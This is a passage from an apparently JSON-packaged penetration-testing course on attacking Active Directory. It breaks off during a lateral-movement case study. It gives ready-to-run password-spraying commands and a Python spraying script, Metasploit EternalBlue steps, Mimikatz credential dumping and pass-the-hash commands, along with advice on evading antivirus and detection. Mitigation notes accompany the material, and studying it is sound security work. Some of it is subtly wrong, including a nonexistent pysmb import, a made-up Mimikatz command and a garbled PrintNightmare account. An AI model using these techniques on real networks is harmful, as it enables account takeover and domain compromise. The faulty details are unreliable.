relationships.**\r\n\r\n    Trust relationships allow users in one domain to access resources in another domain. Enumerating trust relationships can reveal potential attack paths between domains.\r\n\r\n    **Example:**\r\n\r\n    ```powershell\r\n    Get-ADTrust -Filter * -Properties * | Select-Object Name, TargetDomain, TrustDirection, TrustType | Export-Csv -Path trusts.csv\r\n    ```\r\n\r\n    **Interpreting the Results:**\r\n\r\n    The output will show you a list of trust relationships, along with their attributes. Pay attention to the `TrustDirection` attribute, which indicates the direction of the trust (e.g., `Inbound`, `Outbound`, `Bidirectional`).\r\n\r\n    **Why is this important?**  Trust relationships can be exploited to gain access to resources in other domains.  For example, if you compromise a domain that trusts another domain, you may be able to use that trust to gain access to the trusted domain.\r\n\r\n**2.6: Advanced Enumeration Tools**\r\n\r\nWhile the previous techniques are useful, there are also dedicated tools that automate and streamline the enumeration process.\r\n\r\n*   **2.6.1: `Nmap` scripting engine (NSE) scripts for AD enumeration.**\r\n\r\n    `Nmap`'s NSE (Nmap Scripting Engine) provides a powerful way to automate network enumeration. There are several NSE scripts specifically designed for Active Directory enumeration.\r\n\r\n    **Examples:**\r\n\r\n    *   `smb-enum-domains`:  Enumerates domain information via SMB.\r\n\r\n        ```bash\r\n        nmap --script smb-enum-domains -p445 dc01.yourdomain.local\r\n        ```\r\n\r\n    *   `smb-enum-users`: Enumerates user accounts via SMB.\r\n\r\n        ```bash\r\n         nmap --script smb-enum-users -p445 --script-args 'smbusername=yourusername,smbpassword=yourpassword' dc01.yourdomain.local\r\n        ```\r\n\r\n    *   `ldap-search`: Performs LDAP queries.\r\n\r\n        ```bash\r\n        nmap --script ldap-search -p389 --script-args 'ldap.base=\"dc=yourdomain,dc=local\", ldap.filter=\"(objectClass=*)\"' dc01.yourdomain.local\r\n        ```\r\n\r\n    **Why is this important?** NSE scripts automate the enumeration process, saving you time and effort. They can also provide more detailed information than manual enumeration techniques.\r\n\r\n*   **2.6.2: `Enum4Linux` for comprehensive enumeration.**\r\n\r\n    `Enum4Linux` is a Linux tool that automates many of the enumeration techniques we've discussed. It performs a wide range of checks, including:\r\n\r\n    *   NetBIOS enumeration\r\n    *   RPC enumeration\r\n    *   LDAP enumeration\r\n    *   SMB enumeration\r\n\r\n    **Example:**\r\n\r\n    ```bash\r\n    enum4linux -a dc01.yourdomain.local\r\n    ```\r\n\r\n    The `-a` flag tells `Enum4Linux` to perform all checks.\r\n\r\n    **Why is this important?** `Enum4Linux` provides a comprehensive and automated way to enumerate the AD environment. It's a great tool for quickly gathering a lot of information.\r\n\r\n**2.7: Case Study: Analyzing real-world enumeration findings and their impact.**\r\n\r\nLet's imagine a scenario where you're conducting a penetration test of a company's Active Directory environment. During enumeration, you discover the following:\r\n\r\n*   **Anonymous LDAP access is enabled:** You can retrieve a list of all users, groups, and computers without providing any credentials.\r\n*   **A network share is accessible to everyone:** This share contains sensitive documents, including payroll information and employee passwords.\r\n*   **A domain controller has an unpatched vulnerability:** This vulnerability allows for remote code execution.\r\n\r\n**Impact:**\r\n\r\n*   **Compromise of user accounts:** With anonymous LDAP access, you can easily identify user accounts with weak passwords and target them for password spraying attacks.\r\n*   **Data breach:** The publicly accessible network share allows you to steal sensitive data, including payroll information and employee passwords.\r\n*   **Domain compromise:** The unpatched vulnerability on the domain controller allows you to gain complete control of the AD environment.\r\n\r\n**Remediation:**\r\n\r\n*   **Disable anonymous LDAP access:** Require authentication for LDAP queries.\r\n*   **Restrict access to the network share:** Only allow authorized users to access the share.\r\n*   **Patch the domain controller:** Apply the latest security patches to prevent exploitation of the vulnerability.\r\n\r\n**Why is this important?** This case study highlights the importance of thorough enumeration. By identifying vulnerabilities early on, you can prevent a major security breach.\r\n\r\n---\r\n\r\n**Module 2 Project: Active Directory Enumeration**\r\n\r\n1.  **Environment:** Use the Active Directory lab you built in Module 1.\r\n\r\n2.  **Tools:** Utilize `nslookup`, `dig`, `ping`, `traceroute`, `ldapsearch`, `rpcclient`, `nmap`, `enum4linux`, and PowerShell cmdlets.\r\n\r\n3.  **Tasks:**\r\n\r\n    *   **DNS Enumeration:** Use `nslookup` and `dig` to gather DNS information about the AD environment. Document the domain controllers, service records, and hostnames you discover.\r\n\r\n    *   **LDAP Enumeration:** Use `ldapsearch` to enumerate users, groups, computers, and OUs. Experiment with different LDAP filters to target specific information. Document your findings, including user accounts, group memberships, computer names, and OU structure.\r\n\r\n    *   **RPC Enumeration:** Use `rpcclient` to explore RPC services and shares. Identify open ports and services using `nmap`. Gather NetBIOS information using `nbtscan`. Document your findings, including open ports, shared resources, and running services.\r\n\r\n    *   **PowerShell Enumeration:** Use PowerShell cmdlets to enumerate users, groups, computers, GPOs, and trust relationships. Document your findings, including user accounts, group memberships, computer names, GPOs, and trust relationships.\r\n\r\n    *   **Automated Enumeration:** Use `Nmap` NSE scripts and `Enum4Linux` to automate the enumeration process. Document your findings.\r\n\r\n    *   **Target Prioritization:** Based on your findings, prioritize potential targets for further investigation. Identify accounts with weak passwords, systems with unpatched vulnerabilities, and shares with sensitive data.\r\n\r\n    *   **Script Development:** Start building your personal enumeration script (Python or PowerShell) that automates the enumeration process. Include functionality to:\r\n        *   Enumerate users, groups, and computers via LDAP.\r\n        *   Identify open ports and services using `nmap`.\r\n        *   Enumerate network shares using `rpcclient`.\r\n        *   Export the results to a CSV file.\r\n\r\n4.  **Documentation:**  Document all steps taken during the enumeration process. Include screenshots and code snippets to illustrate your findings.  Document the potential impact of each vulnerability.\r\n\r\nThis project will give you hands-on experience with the various enumeration techniques we've discussed. It will also help you develop your own custom enumeration script, which will be a valuable tool in your penetration testing arsenal. Remember to focus on understanding *why* you are doing each step, not just blindly following instructions. This understanding will allow you to adapt these techniques to different environments and situations. Good luck!"
    },
    {
      "title": "module_3",
      "description": "module_3 Overview",
      "order": 3,
      "content": "Alright, let's dive into Module 3: Initial Access! This is where we go from gathering information to actually trying to get a foothold inside the Active Directory environment. We'll focus heavily on password spraying and touch on exploiting vulnerabilities. Remember, this is all about *understanding* the techniques, so we'll build our own basic tools along the way.\r\n\r\n# Module 3: Initial Access - Gaining a Foothold\r\n\r\n**Module Objective:** Learn and practice techniques to gain initial access to the Active Directory environment, simulating the first stage of a penetration test.\r\n\r\n## 3.1 Understanding the Attack Surface\r\n\r\nBefore we start launching attacks, let's think like an attacker. What are the potential entry points into our Active Directory domain?\r\n\r\n*   **User Accounts:** The most common target. We'll be focusing on these.\r\n*   **Workstations:** If a workstation is compromised, it can be used as a springboard to attack other systems.\r\n*   **Servers:** Servers often run critical services and may have vulnerabilities.\r\n*   **Web Applications:** If the AD environment integrates with web applications, vulnerabilities in those apps could lead to AD compromise.\r\n*   **Network Devices:** Less common but still a possibility.\r\n\r\nIn this module, we'll primarily focus on targeting user accounts because they represent a readily accessible and often vulnerable attack surface.\r\n\r\n## 3.2 Assumed Compromise\r\n\r\nFor some techniques, we'll start from the perspective of having already compromised a workstation. This is a common scenario in real-world attacks. Think of it as having phished a user or exploited a vulnerability on their machine.  This gives us a local foothold to launch further attacks.  We'll cover how to actually get to this state in later modules.\r\n\r\n## 3.3 Password Spraying\r\n\r\nPassword spraying is a low-and-slow attack that attempts to log in to multiple accounts with a small number of common passwords. The goal is to avoid account lockout, which is a common security measure.\r\n\r\n### 3.3.1 Understanding Password Policies and Common Password Patterns\r\n\r\n*   **Password Policies:** Active Directory password policies define the complexity, length, and age requirements for passwords. Common settings include:\r\n    *   Minimum password length\r\n    *   Password complexity requirements (uppercase, lowercase, numbers, symbols)\r\n    *   Password history (preventing reuse of previous passwords)\r\n    *   Account lockout threshold (number of failed login attempts before account lockout)\r\n    *   Account lockout duration\r\n*   **Common Password Patterns:** Attackers often target common password patterns, such as:\r\n    *   `Password123`\r\n    *   `Summer2023`\r\n    *   `CompanyName123` (replace with actual company name)\r\n    *   The current year appended to a simple word (e.g., `Winter2024`)\r\n    *   Keyboard patterns (e.g., `qwerty`)\r\n    *   Default passwords\r\n\r\n### 3.3.2 Tools for Password Spraying\r\n\r\nSeveral tools can be used for password spraying. Here are some popular options:\r\n\r\n*   **Hydra:** A versatile password cracking tool that supports many protocols.\r\n*   **Medusa:** Similar to Hydra, but with a different architecture.\r\n*   **Ncrack:** A network authentication cracking tool from the Nmap project.\r\n*   **CrackMapExec (CME):** A powerful post-exploitation tool that includes password spraying functionality.\r\n\r\nWe'll use `CrackMapExec` for this module because it's specifically designed for attacking Windows networks and has built-in evasion techniques.\r\n\r\n**Installation (if you don't have it already):**\r\n\r\n```bash\r\n# Assumes you have Python and pip installed\r\npip3 install crackmapexec\r\n```\r\n\r\n### 3.3.3 Using CrackMapExec for Password Spraying\r\n\r\nHere's how to use CrackMapExec to perform a password spraying attack:\r\n\r\n1.  **Create a User List:** Create a text file (`users.txt`) containing a list of usernames to target. You can get this list from Module 2's enumeration.\r\n2.  **Create a Password List:** Create a text file (`passwords.txt`) containing a list of common passwords to try. Keep it short to avoid lockouts.\r\n3.  **Run CrackMapExec:**\r\n\r\n    ```bash\r\n    crackmapexec smb <domain_controller_ip> -u users.txt -p passwords.txt --shares --continue-on-success\r\n    ```\r\n\r\n    *   `smb`: Specifies the SMB protocol (used for Windows file sharing and authentication).\r\n    *   `<domain_controller_ip>`: The IP address of your Domain Controller.\r\n    *   `-u users.txt`: Specifies the user list file.\r\n    *   `-p passwords.txt`: Specifies the password list file.\r\n    *   `--shares`: Attempts to list shares after successful login (useful for verification).\r\n    *   `--continue-on-success`: Continues spraying even after finding a valid password.  This is crucial for not locking out all the other accounts if you get one right early on.\r\n\r\n**Example:**\r\n\r\nLet's say our Domain Controller IP is `192.168.1.10`, our `users.txt` contains:\r\n\r\n```\r\nadministrator\r\njohn.doe\r\njane.smith\r\n```\r\n\r\nAnd our `passwords.txt` contains:\r\n\r\n```\r\nPassword123\r\nSummer2023\r\n```\r\n\r\nThen the command would be:\r\n\r\n```bash\r\ncrackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --shares --continue-on-success\r\n```\r\n\r\n**Interpreting the Results:**\r\n\r\nCrackMapExec will output the results of each login attempt. Look for lines that indicate successful logins (usually marked with `+` or `SUCCESS`).  If you find a successful login, document it!\r\n\r\n### 3.3.4 Avoiding Account Lockout\r\n\r\nAccount lockout is the biggest risk with password spraying. Here are some techniques to avoid it:\r\n\r\n*   **Use a Small Password List:** Start with a very small list of common passwords (e.g., 3-5 passwords).\r\n*   **Space Out Attempts:** Use the `--delay` option in CrackMapExec to add a delay between login attempts. This will make the attack slower but less likely to trigger lockout.  For example, `--delay 5` adds a 5-second delay.\r\n*   **Target Specific Accounts:** Focus on accounts that are less likely to be actively monitored (e.g., service accounts, old accounts).\r\n*   **Monitor Account Lockout Policies:**  Before you start, try to determine the account lockout policy. You can sometimes find this information through enumeration (Module 2).\r\n\r\n### 3.3.5 Detecting and Mitigating Password Spraying Attacks\r\n\r\nAs a defender, how would you detect and mitigate password spraying attacks?\r\n\r\n*   **Monitor Login Events:** Analyze Windows event logs for failed login attempts. Look for patterns of failed logins from the same source IP address to multiple user accounts.  Specifically, look for Event ID 4625 (An account failed to log on).\r\n*   **Implement Account Lockout Policies:** Ensure that account lockout policies are properly configured and enforced.\r\n*   **Use Multi-Factor Authentication (MFA):** MFA adds an extra layer of security that makes it much harder for attackers to gain access, even if they have a valid password.\r\n*   **Password Complexity Requirements:** Enforce strong password complexity requirements to make it harder for attackers to guess passwords.\r\n*   **Password Monitoring:** Use tools to monitor for leaked credentials and proactively reset passwords if necessary.\r\n\r\n## 3.4 Credential Stuffing (Brief Overview)\r\n\r\nCredential stuffing is a similar attack to password spraying, but instead of using common passwords, it uses leaked credentials from other breaches. Attackers obtain lists of usernames and passwords from data breaches and try them against various websites and services, including Active Directory.\r\n\r\n**Why it Works:** People often reuse the same username and password across multiple accounts.\r\n\r\n**How to Mitigate:** The same mitigation strategies as password spraying apply.  In addition, users should be educated on the importance of using unique passwords for each account.\r\n\r\n**Note:** We won't be focusing on credential stuffing in this module, but it's important to be aware of it.\r\n\r\n## 3.5 Exploiting Vulnerable Services (Brief Overview)\r\n\r\nWhile password spraying targets user accounts, exploiting vulnerable services targets flaws in the software running on systems within the AD environment.\r\n\r\n### 3.5.1 Identifying Vulnerable Services\r\n\r\nWe can use tools like Nmap to scan for open ports and identify the services running on those ports. Once we know what services are running, we can search for known vulnerabilities.  We touched on this in Module 2.\r\n\r\n```bash\r\nnmap -sV <target_ip>\r\n```\r\n\r\nThe `-sV` option tells Nmap to perform version detection, which attempts to identify the specific version of each service.\r\n\r\n### 3.5.2 Exploiting Known Vulnerabilities\r\n\r\nOnce we've identified a vulnerable service, we can use exploit databases like Exploit-DB or Metasploit to find exploits.\r\n\r\n**Example: EternalBlue (MS17-010)**\r\n\r\nEternalBlue is a vulnerability in the Server Message Block (SMB) protocol that was exploited in the WannaCry ransomware attack.\r\n\r\nIf you identify a system running a vulnerable version of SMB, you could use Metasploit to exploit it.\r\n\r\n```bash\r\n# Start Metasploit\r\nmsfconsole\r\n\r\n# Search for the EternalBlue exploit\r\nsearch eternalblue\r\n\r\n# Use the exploit\r\nuse exploit/windows/smb/ms17_010_eternalblue\r\n\r\n# Set the target IP address\r\nset RHOST <target_ip>\r\n\r\n# Run the exploit\r\nexploit\r\n```\r\n\r\n**Important:** Exploiting vulnerabilities can be risky and may cause system instability.  Only perform these actions in a controlled lab environment.\r\n\r\n**Note:** We'll cover vulnerability exploitation in more detail in later modules.  For now, focus on understanding how to identify vulnerable services.\r\n\r\n## 3.6 Case Study: Analyzing Real-World Initial Access Scenarios and Mitigation Strategies\r\n\r\nLet's look at a few real-world examples of how attackers gain initial access and how to prevent it:\r\n\r\n*   **Scenario 1: Password Spraying against Office 365**\r\n\r\n    *   **Attack:** Attackers used a large list of compromised usernames and a smaller list of common passwords to target Office 365 accounts.\r\n    *   **Impact:** They gained access to email accounts, allowing them to send phishing emails internally and steal sensitive data.\r\n    *   **Mitigation:** Implement MFA, enforce strong password policies, and monitor login events for suspicious activity.\r\n\r\n*   **Scenario 2: Exploiting a Vulnerable Web Application**\r\n\r\n    *   **Attack:** Attackers exploited a SQL injection vulnerability in a web application that was connected to the Active Directory database.\r\n    *   **Impact:** They were able to extract user credentials from the database and use them to log in to the Active Directory domain.\r\n    *   **Mitigation:** Secure web applications by patching vulnerabilities, using parameterized queries, and implementing input validation.\r\n\r\n*   **Scenario 3: Phishing Attack with Malware**\r\n\r\n    *   **Attack:** Attackers sent phishing emails containing malicious attachments. When users opened the attachments, they installed malware that allowed the attackers to gain access to their workstations.\r\n    *   **Impact:** The attackers were able to steal credentials and move laterally within the network.\r\n    *   **Mitigation:** Train users to recognize phishing emails, implement email security filters, and use endpoint detection and response (EDR) solutions.\r\n\r\n## 3.7 Module Project: Password Spraying and Tool Development\r\n\r\nThis module project has two parts:\r\n\r\n1.  **Password Spraying in the Lab:** Attempt to gain initial access to your lab environment using password spraying against valid user accounts. Document your attempts, successes, and failures.\r\n2.  **Build a Simple Password Spraying Tool:** Refine your enumeration script from Module 2 to automatically identify accounts with weak or default passwords. Begin building a simple password spraying tool using Python or PowerShell, incorporating evasion techniques.\r\n\r\n### 3.7.1 Password Spraying in the Lab (Detailed Steps)\r\n\r\n1.  **Prepare Your Environment:** Ensure your Active Directory lab is running and accessible.\r\n2.  **User and Password Lists:** Create `users.txt` and `passwords.txt`.  Start with a *very* small password list.\r\n3.  **Execute CrackMapExec:** Run the `crackmapexec` command as shown above.\r\n4.  **Analyze Results:** Carefully review the output from CrackMapExec.\r\n5.  **Document Your Findings:**  Record:\r\n    *   The commands you used.\r\n    *   The contents of your `users.txt` and `passwords.txt` files.\r\n    *   Any successful logins.\r\n    *   Any account lockouts.\r\n    *   Your observations and lessons learned.\r\n\r\n### 3.7.2 Building a Simple Password Spraying Tool (Python Example)\r\n\r\nHere's a basic Python example to get you started.  This is *very* basic and lacks error handling, evasion, and other important features.  Your goal is to expand on this.\r\n\r\n```python\r\nimport smb.SMB_V1_0 as SMB\r\nimport socket\r\nimport time\r\n\r\ndef spray_password(target_ip, username, password, domain):\r\n    \"\"\"Attempts to authenticate to an SMB share with the given credentials.\"\"\"\r\n    try:\r\n        # Create SMB connection\r\n        conn = SMB.SMB(username, password, \"attacker\", \"server\", domain=domain, is_direct_tcp=True) # Replace attacker and server with appropriate values\r\n\r\n        # Connect to the target\r\n        conn.connect(target_ip, 445)\r\n\r\n        print(f\"[+] Successfully authenticated to {target_ip} as {username} with password {password}\")\r\n        conn.close()\r\n        return True\r\n\r\n    except socket.timeout:\r\n        print(f\"[-] Timeout connecting to {target_ip}\")\r\n        return False\r\n    except Exception as e:\r\n        if \"STATUS_WRONG_PASSWORD\" in str(e):\r\n            print(f\"[-] Incorrect password for {username}@{domain} on {target_ip}\")\r\n            return False\r\n        elif \"STATUS_ACCOUNT_LOCKED_OUT\" in str(e):\r\n            print(f\"[!] Account {username} locked out on {target_ip}\")\r\n            return False\r\n        else:\r\n            print(f\"[-] Error: {e}\")\r\n            return False\r\n\r\nif __name__ == \"__main__\":\r\n    target_ip = \"192.168.1.10\"  # Replace with your DC IP\r\n    domain = \"YOURDOMAIN.LOCAL\"  # Replace with your domain\r\n    users = [\"administrator\", \"john.doe\", \"jane.smith\"]\r\n    passwords = [\"Password123\", \"Summer2023\"]\r\n\r\n    for user in users:\r\n        for password in passwords:\r\n            success = spray_password(target_ip, user, password, domain)\r\n            if success:\r\n                break  # Stop trying passwords for this user\r\n            time.sleep(2) # Add a small delay\r\n\r\n```\r\n\r\n**Explanation:**\r\n\r\n1.  **Import Libraries:** Imports the necessary libraries for SMB communication, socket operations, and time delays.\r\n2.  **`spray_password` Function:**\r\n    *   Takes the target IP, username, password, and domain as input.\r\n    *   Attempts to establish an SMB connection to the target using the provided credentials.\r\n    *   Handles potential exceptions, such as incorrect password, account lockout, and connection errors.\r\n    *   Prints informative messages based on the outcome of the authentication attempt.\r\n3.  **Main Execution Block:**\r\n    *   Sets the target IP, domain, user list, and password list.\r\n    *   Iterates through the user list and password list, calling the `spray_password` function for each combination.\r\n    *   Adds a small delay between login attempts to avoid account lockout.\r\n\r\n**To run this:**\r\n\r\n1.  **Install `pysmb`:** `pip3 install pysmb` (This library is used for SMB communication).\r\n2.  **Replace Placeholders:** Update `target_ip` and `domain` with your lab values.\r\n3.  **Run the script:** `python3 your_script_name.py`\r\n\r\n**Next Steps:**\r\n\r\n*   **Error Handling:** Add more robust error handling.\r\n*   **Command-Line Arguments:** Use `argparse` to allow users to specify the target IP, user list, and password list from the command line.\r\n*   **Evasion:** Implement techniques to avoid detection (e.g., randomizing the order of usernames, using different source IPs).  This is crucial for a real-world attack.\r\n*   **Logging:** Add logging to record all login attempts and their outcomes.\r\n*   **Integration with Enumeration:**  Modify your Module 2 enumeration script to output a list of usernames suitable for this tool.\r\n*   **Threading:**  Use threading to speed up the attack (but be careful about lockouts!).\r\n\r\nThis module is about understanding the basics of initial access.  By building your own tool, you'll gain a much deeper understanding of how these attacks work and how to defend against them.  Good luck!"
    },
    {
      "title": "module_4",
      "description": "module_4 Overview",
      "order": 4,
      "content": "Okay, let's dive deep into Module 4: Lateral Movement. This is where things get *really* interesting! We'll be focusing on how to move from an initial foothold (a compromised workstation or user account) to gain access to more privileged resources within the Active Directory environment.\r\n\r\n# Module 4: Lateral Movement - Expanding Your Reach\r\n\r\n**Module Objective:** Learn and apply techniques to move laterally within the Active Directory environment, gaining access to more privileged accounts and systems.\r\n\r\n## 4.1 Understanding Lateral Movement\r\n\r\n*   **Why is it crucial for domain compromise?**\r\n\r\n    Lateral movement is the art of pivoting from one compromised system to another.  Think of it like navigating a maze.  Initial access is just the entrance.  Domain compromise is reaching the center, and lateral movement is the series of turns and paths you take to get there.  It's crucial because:\r\n\r\n    *   **Privilege Escalation:**  The initial compromise might be a low-privilege user. Lateral movement allows you to find and compromise accounts with higher privileges.\r\n    *   **Data Access:**  Critical data is rarely stored on a single system. Lateral movement lets you access data stored across the network.\r\n    *   **Persistence:**  If your initial foothold is discovered and removed, lateral movement allows you to maintain access through other compromised systems.\r\n    *   **Domain Dominance:**  Ultimately, lateral movement aims to compromise domain controllers or accounts with administrative privileges, granting full control of the Active Directory environment.\r\n\r\n## 4.2 Pass-the-Hash (PtH)\r\n\r\n*   **Understanding NTLM hashes and their use in authentication:**\r\n\r\n    NTLM (NT LAN Manager) is an older authentication protocol still widely used in many Active Directory environments. Instead of transmitting passwords in plaintext, NTLM uses a hash of the password.  This hash can be used to authenticate to other systems without knowing the actual password.  The NTLM hash is a 16-byte MD4 hash of the UTF-16LE representation of the password.\r\n\r\n    *   **Why is this a problem?**  If you can obtain the NTLM hash of a user account, you can use it to authenticate to other systems where that user has access.  This bypasses the need to crack the password itself.  This is the core principle of Pass-the-Hash.\r\n\r\n*   **Tools:**\r\n\r\n    *   **Mimikatz:**  A powerful post-exploitation tool that can extract credentials, including NTLM hashes, from memory.  It's a must-have for any penetration tester.\r\n    *   **Impacket:**  A collection of Python classes for working with network protocols.  It includes tools for performing PtH attacks.\r\n    *   **Metasploit:**  A penetration testing framework that includes modules for performing PtH attacks.\r\n\r\n*   **Example using Mimikatz:**\r\n\r\n    First, you need to get Mimikatz onto the compromised system.  This is outside the scope of this module (we're assuming a compromised host).  Then, execute Mimikatz:\r\n\r\n    ```powershell\r\n    # Run Mimikatz (you might need to bypass AV)\r\n    .\\mimikatz.exe\r\n    ```\r\n\r\n    Inside Mimikatz:\r\n\r\n    ```\r\n    privilege::debug  # Elevate privileges\r\n    sekurlsa::logonpasswords  # Extract credentials\r\n    ```\r\n\r\n    This will output a lot of information, including the NTLM hashes of logged-on users.  Look for the `NT hash` value.\r\n\r\n*   **Example using Impacket's `psexec.py`:**\r\n\r\n    `psexec.py` allows you to execute commands on a remote system using PtH.  You'll need the NTLM hash, the username, and the target system's IP address.\r\n\r\n    ```bash\r\n    # Example usage\r\n    python3 psexec.py domain/username@target_ip -hashes lmhash:nthash -c \"whoami\"\r\n    ```\r\n\r\n    *   `domain/username`: The domain and username of the account whose hash you have.\r\n    *   `target_ip`: The IP address of the target system.\r\n    *   `-hashes lmhash:nthash`:  Specifies the LM and NT hashes.  If you only have the NT hash, you can use `aad3b435b51404eeaad3b435b51404ee:nthash` as the LM hash is usually a default value.\r\n    *   `-c \"whoami\"`:  The command to execute on the remote system.\r\n\r\n*   **Mitigation Strategies:**\r\n\r\n    *   **Disabling NTLM:**  The best long-term solution is to migrate to Kerberos-only authentication.  This is a complex process but significantly reduces the attack surface.  Use Group Policy to restrict NTLM usage.\r\n    *   **Protected Users Group:**  Adding users to the Protected Users group enforces stronger authentication mechanisms and prevents the caching of credentials.\r\n    *   **Account Monitoring:**  Monitor for suspicious authentication activity, such as multiple failed login attempts or logins from unusual locations.\r\n    *   **Enable LSA Protection (RunAsPPL):**  This protects the Local Security Authority (LSA) process, making it harder for Mimikatz to extract credentials from memory.  This requires a reboot.\r\n\r\n## 4.3 Pass-the-Ticket (PtT)\r\n\r\n*   **Understanding Kerberos tickets (TGTs and Service Tickets):**\r\n\r\n    Kerberos is the default authentication protocol in modern Active Directory environments.  It uses tickets to grant access to resources.\r\n\r\n    *   **Ticket Granting Ticket (TGT):**  Obtained when a user initially authenticates.  It's like a master key that allows the user to request service tickets.\r\n    *   **Service Ticket:**  Granted for accessing a specific service (e.g., a file share, a database).  It's like a key specifically for a particular door.\r\n\r\n*   **Why is this a problem?**  If you can obtain a valid Kerberos ticket (either a TGT or a service ticket), you can use it to authenticate to the corresponding service without knowing the user's password.\r\n\r\n*   **Tools:**\r\n\r\n    *   **Mimikatz:**  Can be used to extract Kerberos tickets from memory and inject them into the current session.\r\n    *   **Impacket:**  Provides tools for manipulating Kerberos tickets.\r\n\r\n*   **Example using Mimikatz:**\r\n\r\n    ```powershell\r\n    # Run Mimikatz\r\n    .\\mimikatz.exe\r\n\r\n    # Extract Kerberos tickets\r\n    kerberos::tktpass\r\n\r\n    # Import a specific ticket (if you have a .kirbi file)\r\n    kerberos::ptt <ticket_file.kirbi>\r\n    ```\r\n\r\n*   **Example using Impacket's `ticketer.py`:**\r\n\r\n    `ticketer.py` can be used to forge Kerberos tickets. This is more advanced and requires a deeper understanding of Kerberos.\r\n\r\n*   **Mitigation Strategies:**\r\n\r\n    *   **Kerberos Armoring (Flexible Authentication Secure Tunneling - FAST):**  Encrypts the Kerberos authentication process, preventing attackers from intercepting and replaying tickets.\r\n    *   **Account Monitoring:**  Monitor for suspicious ticket requests or unusual access patterns.\r\n    *   **Implement Privileged Access Workstations (PAWs):**  Dedicated, hardened workstations for administrative tasks.\r\n    *   **Limit Ticket Lifetime:** Configure shorter Kerberos ticket lifetimes, reducing the window of opportunity for attackers.\r\n\r\n## 4.4 Overpass-the-Hash (OtH)\r\n\r\n*   **Bypassing NTLM restrictions with Kerberos:**\r\n\r\n    In environments where NTLM is restricted, Overpass-the-Hash leverages Kerberos to use an NTLM hash to obtain a Kerberos ticket. This ticket can then be used to access resources. This is a more advanced technique and relies on specific configurations.\r\n\r\n*   **Tools:**\r\n\r\n    *   **Rubeus:** A C# tool for Kerberos abuse.\r\n    *   **Impacket:** Can be used, though Rubeus is often preferred.\r\n\r\n* **Example Using Rubeus**\r\n\r\n    ```\r\n    Rubeus.exe asktgt /user:username /domain:domain.local /ntlm:HASH /ptt\r\n    ```\r\n\r\n    Where:\r\n\r\n    *   `username` is the username.\r\n    *   `domain.local` is the domain.\r\n    *   `HASH` is the NTLM hash.\r\n    *   `/ptt` injects the ticket into the current session.\r\n\r\n*   **Mitigation Strategies:**\r\n    *   Focus on mitigations for NTLM and Kerberos vulnerabilities, as OTH exploits these.\r\n\r\n## 4.5 Impacket\r\n\r\n*   **A powerful Python library for network protocols:**\r\n\r\n    Impacket is an incredibly valuable tool for penetration testers. It provides a collection of Python classes for working with network protocols, including SMB, NTLM, Kerberos, and more.  It's used extensively for lateral movement and post-exploitation.\r\n\r\n*   **`psexec.py`, `smbexec.py`, `wmiexec.py`: Remote code execution techniques:**\r\n\r\n    These are Impacket scripts that allow you to execute commands on a remote system.  They use different methods for remote code execution:\r\n\r\n    *   **`psexec.py`:**  Creates a service on the target system and uses it to execute commands.  It's a classic technique but can be easily detected. Requires SMB.\r\n    *   **`smbexec.py`:**  Similar to `psexec.py` but uses a different method for creating the service. Also requires SMB.\r\n    *   **`wmiexec.py`:**  Uses Windows Management Instrumentation (WMI) to execute commands.  It's often more stealthy than `psexec.py` but can be more complex to configure.\r\n\r\n    **Example using `psexec.py` (again, building on a compromised account):**\r\n\r\n    ```bash\r\n    python3 psexec.py domain/username:password@target_ip -c \"whoami /all\"\r\n    ```\r\n\r\n    or with hashes:\r\n\r\n    ```bash\r\n    python3 psexec.py domain/username@target_ip -hashes lmhash:nthash -c \"whoami /all\"\r\n    ```\r\n\r\n*   **Key Impacket Modules:**\r\n\r\n    *   `smb`: Handles SMB/CIFS protocol interactions.\r\n    *   `dcerpc`: Handles DCE/RPC protocol interactions.\r\n    *   `ntlm`: Provides NTLM authentication support.\r\n    *   `krb5`: Provides Kerberos authentication support.\r\n\r\n## 4.6 Psexec\r\n\r\n*   **Using PsExec for remote code execution (understanding its limitations and alternatives):**\r\n\r\n    PsExec is a Sysinternals tool that allows you to execute processes on remote systems. It's similar to Impacket's `psexec.py` but is a standalone executable.\r\n\r\n    *   **Limitations:**  PsExec is easily detected by security tools.  It creates a service on the target system, which leaves traces.\r\n    *   **Alternatives:**  Impacket's `wmiexec.py` and WinRM are often better alternatives for stealthier remote code execution.\r\n\r\n    **Example Usage:**\r\n\r\n    ```\r\n    psexec.exe \\\\target_ip -u domain\\username -p password cmd.exe\r\n    ```\r\n\r\n## 4.7 Windows Remote Management (WinRM)\r\n\r\n*   **Leveraging WinRM for lateral movement:**\r\n\r\n    WinRM is a Windows service that allows you to manage remote systems using WS-Management protocol.  It's a powerful tool for lateral movement because it's often enabled by default in Active Directory environments.\r\n\r\n    *   **Advantages:**  More stealthy than PsExec.  Uses standard HTTP/HTTPS protocols.\r\n    *   **Disadvantages:** Requires WinRM to be enabled on the target system.  Can be more complex to configure.\r\n\r\n    **PowerShell Example:**\r\n\r\n    ```powershell\r\n    # Enable WinRM (if not already enabled)\r\n    Enable-PSRemoting -Force\r\n\r\n    # Create a remote session\r\n    $session = New-PSSession -ComputerName target_ip -Credential domain\\username\r\n\r\n    # Execute a command remotely\r\n    Invoke-Command -Session $session -ScriptBlock { Get-Process }\r\n\r\n    # Close the session\r\n    Remove-PSSession $session\r\n    ```\r\n\r\n    **Python Example (using `winrm` library):**\r\n\r\n    ```python\r\n    import winrm\r\n\r\n    s = winrm.Session('target_ip', auth=('username', 'password'))\r\n    r = s.run_ps('Get-Process')\r\n\r\n    print(r.status_code)\r\n    print(r.std_out)\r\n    print(r.std_err)\r\n    ```\r\n\r\n    *   You might need to configure WinRM trusted hosts: `Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"*\"`\r\n\r\n## 4.8 Case Study: Analyzing Real-World Lateral Movement Scenarios\r\n\r\n*   **Scenario 1: The Printer Bug**\r\n\r\n    An attacker gains initial access to a workstation used by an employee with access to a network printer. Using PrintNightmare (CVE-2021-34527), the attacker is able to force the printer to authenticate with NTLM to the attacker's machine, gaining the employee's NTLM hash. The attacker then uses PtH to access other systems on the network using the stolen credentials.\r\n\r\n*   **Scenario 2: The SQL Server Leak**\r\n\r\n    An attacker compromises a web server connected to a SQL Server. The attacker discovers that the SQL Server service account has domain admin privileges (a common misconfiguration). The attacker dumps the credentials of the SQL Server service account using `Mimikatz` and uses them to compromise the entire domain.\r\n\r\n*   **Scenario 3: The GPO Mishap**\r\n\r\n    An attacker exploits a vulnerability to modify a Group Policy Object (GPO). The attacker modifies the GPO to execute a malicious script on all systems in the domain. This script installs a backdoor and 